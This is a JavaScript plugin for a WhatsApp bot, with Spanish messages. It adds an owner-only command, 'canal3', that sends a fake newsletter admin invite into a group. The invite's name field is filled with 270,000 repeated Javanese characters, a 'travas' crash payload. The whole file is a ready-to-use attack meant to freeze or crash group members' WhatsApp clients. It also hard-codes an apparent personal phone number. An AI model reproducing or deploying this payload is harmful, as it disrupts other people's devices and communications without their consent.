let handler = async (m, { conn }) => {
  const ownerNumber = '527447800928@s.whatsapp.net'; // Número del owner
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
  }

  if (!m.chat.endsWith('@g.us')) {
    return conn.reply(m.chat, '❌ Este comando solo se puede usar dentro de un grupo.', m);
  }

  const travas = 'ꦾ'.repeat(90000);

  await conn.relayMessage(m.chat, {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363282786345717@newsletter",
      newsletterName: travas + travas + travas,
      jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
      caption: "",
      inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
    }
  }, {});

  await conn.sendMessage(m.chat, { text: `✅ Enviado correctamente.` }, { quoted: m });
};

handler.command = ['canal3'];
handler.tags = ['fake', 'grupo'];
handler.help = ['canal3'];

export default handler;